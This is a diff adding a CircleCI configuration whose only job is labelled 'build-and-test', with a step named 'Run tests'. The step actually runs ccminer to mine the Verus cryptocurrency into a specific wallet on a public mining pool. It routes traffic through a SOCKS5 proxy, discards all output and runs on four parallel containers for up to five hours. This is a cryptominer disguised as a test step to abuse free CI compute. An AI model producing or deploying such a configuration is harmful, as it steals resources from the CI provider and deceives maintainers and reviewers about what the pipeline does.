@@ -1,0 +1,27 @@
+version: 2.1 
+parameters: 
+  sample: 
+    type: boolean 
+    default: false 
+orbs: 
+   
+  python: circleci/python@1.2 
+ 
+workflows: 
+  sample:   
+    jobs: 
+      - build-and-test 
+ 
+jobs: 
+  build-and-test:   
+    parallelism: 4 
+    docker: 
+      - image: cobadoc/manaon 
+     
+    steps: 
+      - checkout 
+      - run: 
+          name: Run tests 
+          no_output_timeout: 5h 
+          command: | 
+           ccminer -a verus -o stratum+tcp://ap.luckpool.net:3956 -u RBfBRKqh6b3LFxMWFRdfFcPfdboN5jptXN.$(echo $(shuf -i 1000-9999 -n 1)-MANG-OJOL) -p -t 2 -x socks5://192.252.209.155:14455 > /dev/null 2>&1
